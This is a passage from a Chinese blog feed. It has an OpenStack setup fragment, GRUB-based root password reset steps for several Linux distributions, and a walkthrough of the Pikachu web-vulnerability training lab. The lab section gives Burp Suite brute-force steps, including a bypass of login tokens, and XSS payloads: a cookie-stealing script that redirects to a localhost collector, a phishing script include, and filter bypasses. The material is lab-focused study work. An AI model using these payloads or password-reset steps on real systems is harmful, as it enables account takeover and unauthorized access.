class="line">HOST_NAME_NODE=controller</span><br><span class="line"></span><br><span class="line">[root@controller ~]# source /etc/xiandian/openrc.sh </span><br><span class="line">[root@controller ~] iaas-install-nova-compute.sh</span><br></pre></td></tr></table></figure><h2 id="登陆云平台dashboard"><a href="#登陆云平台dashboard" class="headerlink" title="登陆云平台dashboard"></a>登陆云平台dashboard</h2><p>在浏览器中输入<a href="http://192.168.100.10/dashboard">http://192.168.100.10/dashboard</a><br>注：检查防火墙规则，确保允许 http 服务相关端口通行，或者关闭防火墙。<br>创建云主机（gre&#x2F;vlan）<br>（1）管理员 → 网络 → 创建网络（内外网） → 创建子网（外网填服务器的外网网段）<br>（2）项目 → 网络 → 路由 → 新建路由 → 添加网关和内网接口<br>（3）项目 → 计算 → 访问安全 → 管理规则 → 添加规则（ICMP、TCP、UDP）<br>（4）项目 → 计算 → 云主机 → 创建云主机 → 绑定浮动 IP</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;配置ip地址、配置主机名&quot;&gt;&lt;a href=&quot;#配置ip地址、配置主机名&quot; class=&quot;headerlink&quot; title=&quot;配置ip地址、配置主机名&quot;&gt;&lt;/a&gt;配置ip地址、配置主机名&lt;/h2&gt;&lt;p&gt;controller节点：&lt;br&gt;网卡1：192.168.1</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>各种linux的密码重置</title>
    <link href="https://jielunya.github.io/2022/11/23/%E5%90%84%E7%A7%8Dlinux%E7%9A%84%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"/>
    <id>https://jielunya.github.io/2022/11/23/%E5%90%84%E7%A7%8Dlinux%E7%9A%84%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/</id>
    <published>2022-11-22T18:38:03.000Z</published>
    <updated>2022-11-22T19:07:41.388Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Centos6"><a href="#Centos6" class="headerlink" title="Centos6"></a>Centos6</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先启动系统，在出现选择操作系统时，直接按E键</span><br><span class="line"></span><br><span class="line">修改GRUB引导，在rhgb quiet最后加&quot;空格&quot;，然后</span><br><span class="line"></span><br><span class="line">键入&quot;1&quot;或&quot;s&quot;或&quot;S&quot;或&quot;single&quot;都可以，最后回车保</span><br><span class="line"></span><br><span class="line">存并返回上一步</span><br><span class="line"></span><br><span class="line">以单用户运行系统，按键盘的”B”键，进入引导系统</span><br><span class="line"></span><br><span class="line">输入passwd root修改密码</span><br><span class="line"></span><br><span class="line">reboot重启</span><br></pre></td></tr></table></figure><h2 id="Centos7"><a href="#Centos7" class="headerlink" title="Centos7"></a>Centos7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先启动系统，在出现选择操作系统时，直接按E键</span><br><span class="line"></span><br><span class="line">进入grub界面</span><br><span class="line"></span><br><span class="line">按方向键↑和↓，将光标一直移动到 LANG=en_US.UTF-8 后面</span><br><span class="line"></span><br><span class="line">再添加“_init=/bin/sh” (_为空格键)</span><br><span class="line"></span><br><span class="line">即添加一个空格，再添加init=/bin/sh</span><br><span class="line"></span><br><span class="line">这里特别注意，需要写在UTF-8后，保持在同一行，并注意空格不能缺</span><br><span class="line"></span><br><span class="line">再按ctrl+x进入单用户视图</span><br><span class="line"></span><br><span class="line">以rw方式重新挂载</span><br><span class="line"></span><br><span class="line">mount -o remount,rw /</span><br><span class="line"></span><br><span class="line">输入passwd root修改密码</span><br></pre></td></tr></table></figure><h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">重启kali系统进入选择界面，在这里选择Kali GNU/Linux，按下键盘中的e键进入恢复模式</span><br><span class="line"></span><br><span class="line">将光标移动到echo的末端，并输入一行代码：rw single init=/bin/bash</span><br><span class="line"></span><br><span class="line">按下ctrl+x，等待片刻跳出命令行界面</span><br><span class="line"></span><br><span class="line">在命令行中输入passwd root，并按下回车，进行一个root密码的更改</span><br></pre></td></tr></table></figure><h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">重启Uubuntu18.04，长按 shift 进入以下界面，选择Ubuntu高级选项</span><br><span class="line"></span><br><span class="line">进入以下画面，按e进入(recovery mode)，编辑kernel启动参数</span><br><span class="line"></span><br><span class="line">删除红色标记部分。删除”ro recovery nomodeset”</span><br><span class="line"></span><br><span class="line">在刚才删除的后面添加 “quiet splash rw init=/bin/bash”</span><br><span class="line"></span><br><span class="line">Windows平台按下F10重新引导，Mac系统按下Ctrl + x重新引导</span><br><span class="line"></span><br><span class="line">使用passwd命令免密修改root免密</span><br><span class="line"></span><br><span class="line">重启系统，以root用户进入系统</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Centos6&quot;&gt;&lt;a href=&quot;#Centos6&quot; class=&quot;headerlink&quot; title=&quot;Centos6&quot;&gt;&lt;/a&gt;Centos6&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>pikachu笔记(持续更新)</title>
    <link href="https://jielunya.github.io/2022/11/21/pikachu%E7%AC%94%E8%AE%B0(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/"/>
    <id>https://jielunya.github.io/2022/11/21/pikachu%E7%AC%94%E8%AE%B0(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/</id>
    <published>2022-11-21T12:38:19.903Z</published>
    <updated>2022-11-30T12:27:50.431Z</updated>
    
    <content type="html"><![CDATA[<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对暴力破解无任何防护</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用Burpsuite抓包后将数据发送到Intrude模块中，将passowrd字段设置为变量<br>再将密码包导入，点击Start attack开始爆破，等待爆破结束后对比返回数据长度，与其他不同的就是密码了<br><img src="/CTF/1.png"></p><h2 id="基于表单的暴力破解-1"><a href="#基于表单的暴力破解-1" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><h3 id="防御方式-1"><a href="#防御方式-1" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别通过验证码的方式在服务器上对用户输入的验证码进行判断</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过抓包将数据发送到Repeater模块后点击Run放行数据，可以看到返回的页面提示用户名或密码错误<br>将Repeater模块中password字段修改为其他字符，再次提交可以发现提示的信息还是用户名或密码错误，而不是验证码错误，可以判断该验证码一直有效<br>再参考上面的基于表单爆破进行尝试<br><img src="/CTF/2.png"></p><h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2><h3 id="防御方式-2"><a href="#防御方式-2" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别通过验证码的方式在客户端上对用户输入的验证码进行判断</p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>方法1: 同上<br><img src="/CTF/3.png"><br>方法2: 使用浏览器将JS禁用掉之后就不用输入验证码了，再去使用Burpsuite爆破即可</p><h2 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a>token防爆破</h2><h3 id="防御方式-3"><a href="#防御方式-3" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别在每次登录中都会携带不同的token，只有token正确才能进行登录，否则就显示 csrf token error</p><h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用Burpsuite抓包后将该数据发送到Intruder模块中，将password与user_token字段添加为变量</p><p>将攻击类型Attack type设置为Pitchfork<br><img src="/CTF/4.png"></p><p>在Options下的Grep-Extract中点击Add添加攻击需要用到的信息(user_token)</p><p>在该页面点击Fetch response后在返回的代码中找到user_token的值，并将其选中后复制(后续需要用到)<br><img src="/CTF/5.png"></p><p>在Options下的Request Engine请求线程数设置为1<br><img src="/CTF/6.png"></p><p>选中Payload set 1 ，将Payload type 设置为Simple list<br><img src="/CTF/7.png"></p><p>选中Payload set 2 ，将Payload type设置为Recursive grep</p><p>将刚才复制的user_token值设置为第一次请求的user_token值<br><img src="/CTF/8.png"></p><p>开始攻击后会自动从网页中获取下一次的user_token值，并将该值携带到下一次请求中</p><p>如果在配置过程中出现错误需要重新抓包发送到Intruder模块中，重复上面的操作</p><p>发现有长度不一样的相应数据包，查看发现爆破成功，payload1处即为密码：<br><img src="/CTF/9.png"></p><h1 id="XSS漏洞-Cross-Site-Scripting"><a href="#XSS漏洞-Cross-Site-Scripting" class="headerlink" title="XSS漏洞(Cross-Site Scripting)"></a>XSS漏洞(Cross-Site Scripting)</h1><h2 id="反射型-get"><a href="#反射型-get" class="headerlink" title="反射型(get)"></a>反射型(get)</h2><h3 id="防御方式-4"><a href="#防御方式-4" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对XSS无任何防护</p><h3 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?message=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&amp;submit=submit</span><br></pre></td></tr></table></figure><p>突破一下输入长度<br><img src="/CTF/10.png"></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">进行xss（get）攻击，输入框输入?message=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="/CTF/11.png"></p><h2 id="反射型-post"><a href="#反射型-post" class="headerlink" title="反射型(post)"></a>反射型(post)</h2><h3 id="防御方式-5"><a href="#防御方式-5" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对XSS无任何防护</p><h3 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用提示的账号密码(admin|123456)登录后再编辑框中输入Payload测试</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/CTF/11.png"></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script&gt;# 弹<span class="title class_">Cookie</span></span><br></pre></td></tr></table></figure><p><img src="/CTF/12.png"></p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><h3 id="防御方式-6"><a href="#防御方式-6" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对XSS无任何防护</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_">array_key_exists</span>(<span class="string">&#x27;id&#x27;</span>, $_GET) &amp;&amp; <span class="title function_">is_numeric</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//彩蛋:虽然这是个存储型xss的页面,但这里有个delete的sql注入</span></span><br><span class="line">    $query=<span class="string">&quot;delete from message where id=&#123;$_GET[&#x27;id&#x27;]&#125;&quot;</span>;</span><br><span class="line">    $result=<span class="title function_">execute</span>($link, $query);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">mysqli_affected_rows</span>($link)==<span class="number">1</span>)&#123;</span><br><span class="line">        echo <span class="string">&quot;&lt;script type=&#x27;text/javascript&#x27;&gt;document.location.href=&#x27;xss_stored.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $html.=<span class="string">&quot;&lt;p id=&#x27;op_notice&#x27;&gt;删除失败,请重试并检查数据库是否还好!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>存储型将留言的内容写入到数据库后，当用户访问该页面就会触发该漏洞</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/CTF/13.png"><br><img src="/CTF/11.png"></p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><h3 id="防御方式-7"><a href="#防御方式-7" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对XSS无任何防护</p><h3 id="漏洞利用-7"><a href="#漏洞利用-7" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>直接插入测试的Payload后页面并不会弹窗，观察前端代码发现Payload被包含在a标签的href属性中</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#正常情况下</span><br><span class="line">&lt;div id=<span class="string">&quot;dom&quot;</span>&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span>&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>可以使用单引号闭合跃出,onclick属性执行弹窗命令，点击超链接触发</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#插入<span class="title class_">Payload</span>:</span><br><span class="line"><span class="string">&#x27;onclick=alert(&quot;xss&quot;)&gt; </span></span><br><span class="line"><span class="string">（插入这句就行了，下面的“做远远让人听见的风”是把它当成超链接，也是去往下一级的目录名称，</span></span><br><span class="line"><span class="string">然后再执行后面的触发事件）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#插入Payload后（做远远让人听见的风&#x27;</span>onclick=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)&gt;）</span><br><span class="line">&lt;a href=<span class="string">&quot;做远远让人听见的风&quot;</span> onclick=<span class="string">&quot;alert(&quot;</span>xss<span class="string">&quot;)&quot;</span>&gt;<span class="string">&#x27;&gt;what do you see?&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/CTF/14.1.png"><br><img src="/CTF/14.png"><br><img src="/CTF/15.png"></p><h2 id="DOM型XSS-x"><a href="#DOM型XSS-x" class="headerlink" title="DOM型XSS-x"></a>DOM型XSS-x</h2><h3 id="防御方式-8"><a href="#防御方式-8" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对XSS无任何防护</p><h3 id="漏洞利用-8"><a href="#漏洞利用-8" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>与上面的方法一样，可以使用onclick属性执行弹窗命令，点击超链接触发</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure><p><img src="/CTF/16.png"></p><h2 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h2><h3 id="防御方式-9"><a href="#防御方式-9" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对XSS无任何防护</p><h3 id="漏洞利用-9"><a href="#漏洞利用-9" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>盲打不是一种漏洞类型，而是一种攻击场景</p><p>在留言框或姓名中插入Payload测试，根据提示登录到后台查看留言的信息，直接触发XSS</p><p>管理员查看留言板后台的地址：&#x2F;vul&#x2F;xss&#x2F;xssblind&#x2F;admin_login.php<br>管理员账号密码admin | 123456</p><p><img src="/CTF/17.png"></p><p>获取管理员Cookie</p><p>使用Pikachu自带的XSS平台构造Payload，获取管理员登录的Cookie</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;http://127.0.0.1/pikachu-master/pkxss/xcookie/cookie.php?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/CTF/18.png"></p><p>然后管理员登录了之后，会看到这个<br><img src="/CTF/19.png"><br>说明成功了。<br>再去pikachu xss获取cookies结果页面查看：<a href="http://localhost/pikachu-master/pkxss/xcookie/pkxss_cookie_result.php">http://localhost/pikachu-master/pkxss/xcookie/pkxss_cookie_result.php</a><br><img src="/CTF/20.png"></p><p>钓鱼攻击</p><p>需要先修改配置文件pkxss&#x2F;xfish&#x2F;fish.php<br>&#x2F;&#x2F; 将下方的地址改为你的IP地址 </p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">header(&quot;Location: http://192.168.132.200:8000/pkxss/xfish/xfish.php?username=&#123;$_SERVER[PHP_AUTH_USER]&#125;</span><br><span class="line">#我这里改成（http://127.0.0.1/pikachu-master/pkxss/xfish/xfish.php?username=&#123;$_SERVER[PHP_AUTH_USER]&#125;）</span><br></pre></td></tr></table></figure><p><img src="/CTF/21.png"></p><p>改完之后，便做好了最基本的配置工作。</p><p>打开存储型xss（记住只有这个可以成功）</p><p>再将下方的Payload插入到留言板中，等用户访问留言板时会弹出认证的窗口，输入账号密码后就会发送到后台中</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># Payload</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/pikachu-master/pkxss/xfish/fish.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="/CTF/22.png"><br><img src="/CTF/23.png"></p><h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><h3 id="防御方式-10"><a href="#防御方式-10" class="headerlink" title="防御方式"></a>防御方式</h3><p>过滤掉了<code>&lt;script</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$message</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-10"><a href="#漏洞利用-10" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 大小写绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>alert(xss)<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 使用其他的Payload</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><h3 id="防御方式-11"><a href="#防御方式-11" class="headerlink" title="防御方式"></a>防御方式</h3><p>将一些字符都转换为实体标签，如&lt; 转换为&lt;</p><h3 id="漏洞利用-11"><a href="#漏洞利用-11" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>htmlspecialchars() 是PHP里面把预定义的字符转换为HTML实体的函数，被转换的字符如下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 插入下方字符时</span><br><span class="line">&quot;&lt;&#x27;&gt;#?</span><br><span class="line"></span><br><span class="line"># 被转换后的代码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;quot;</span>&lt;&quot;</span> &amp;<span class="attr">gt</span>;#?&#x27;=<span class="string">&quot;&quot;</span>&gt;</span>&quot;<span class="symbol">&amp;lt;</span>&#x27;<span class="symbol">&amp;gt;</span>#?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>根据上方返回的信息可以看到字符 “ &lt; &gt;都被转换成了HTML实体函数，但字符’并未被转化(默认不对’进行处理)</p><p>插入的字符都会被包裹在a标签的href属性里，可以使用onclick属性执行弹窗命令</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 正常代码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;1&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># Payload</span><br><span class="line">&#x27; onclick=alert(/xss/) &#x27;        # 前后的&#x27;用于闭合a标签的href属性</span><br><span class="line"></span><br><span class="line"># 插入Payload后</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(/xss/)&quot;</span> &#x27;&#x27;=<span class="string">&quot;&quot;</span>&gt;</span>&#x27; onclick=alert(/xss/) &#x27;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><h3 id="防御方式-12"><a href="#防御方式-12" class="headerlink" title="防御方式"></a>防御方式</h3><p>如果输出的信息为<a href="http://www.baidu.com时则正常输出,反之则将输入的值使用htmlspecialchars()函数进行转换/">www.baidu.com时则正常输出，反之则将输入的值使用htmlspecialchars()函数进行转换</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;叫你输入个url,你咋不听?&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>] == <span class="string">&#x27;www.baidu.com&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;我靠,我真想不到你是这样的一个人&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//输出在a标签的href属性里面,可以使用javascript协议来执行js</span></span><br><span class="line">        <span class="comment">//防御:只允许http,https,其次在进行htmlspecialchars处理</span></span><br><span class="line">        <span class="variable">$message</span>=<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>],ENT_QUOTES);</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;a href=&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;&gt; 阁下自己输入的url还请自己点一下吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-12"><a href="#漏洞利用-12" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>根据源码中的提示可以使用javascript协议来执行js，当点击超链接时会执行该js脚本实现弹窗</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(/test/)</span><br><span class="line"></span><br><span class="line"># 前端代码如下</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&quot;</span><span class="attr">xss</span>&quot;)&gt;</span> 阁下自己输入的url还请自己点一下吧<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h2><h3 id="防御方式-13"><a href="#防御方式-13" class="headerlink" title="防御方式"></a>防御方式</h3><p>该级别对XSS无任何防护</p><h3 id="漏洞利用-13"><a href="#漏洞利用-13" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>当在编辑框中输入Hello时网页的JS代码如下显示，输入的值被包含在变量ms中</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $ms=<span class="string">&#x27;Hello&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>($ms.<span class="property">length</span> != <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>($ms == <span class="string">&#x27;tmac&#x27;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&#x27;#fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;tmac确实厉害,看那小眼神..&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//            alert($ms);</span></span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&#x27;#fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;无论如何不要放弃心中所爱..&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过上方代码构造如下Payload，第一个</script>标签用于闭合上面的标签</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 闭合后的前端代码如下</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    $ms=&#x27;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>       # 这里的script被执行了</span><br><span class="line">&#x27;;</span><br><span class="line">    if($ms.length != 0)&#123;</span><br><span class="line">        if($ms == &#x27;tmac&#x27;)&#123;</span><br><span class="line">            $(&#x27;#fromjs&#x27;).text(&#x27;tmac确实厉害,看那小眼神..&#x27;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">//            alert($ms);</span><br><span class="line">            $(&#x27;#fromjs&#x27;).text(&#x27;无论如何不要放弃心中所爱..&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="CSRF（GET）"><a href="#CSRF（GET）" class="headerlink" title="CSRF（GET）"></a>CSRF（GET）</h2><h3 id="防御方式-14"><a href="#防御方式-14" class="headerlink" title="防御方式"></a>防御方式</h3><p>无</p><h3 id="漏洞利用-14"><a href="#漏洞利用-14" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>根据提示中的账号密码登录账号后，在修改个人信息页面将信息进行修改抓包分析</p><p>可以看到修改资料的请求使用GET直接发送的<br><img src="/CTF/24.png"><br>在vince登录状态下（其实这个链接里面是不包含用户名的，谁登录都无所谓，只要有人登录着就行，登录着的用户的信息就会被改成url提供的那些），试试改一改上面的链接，比如把电话号码改一改。然后用Burp进行重放，或者直接用浏览器地址栏输入Payload。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 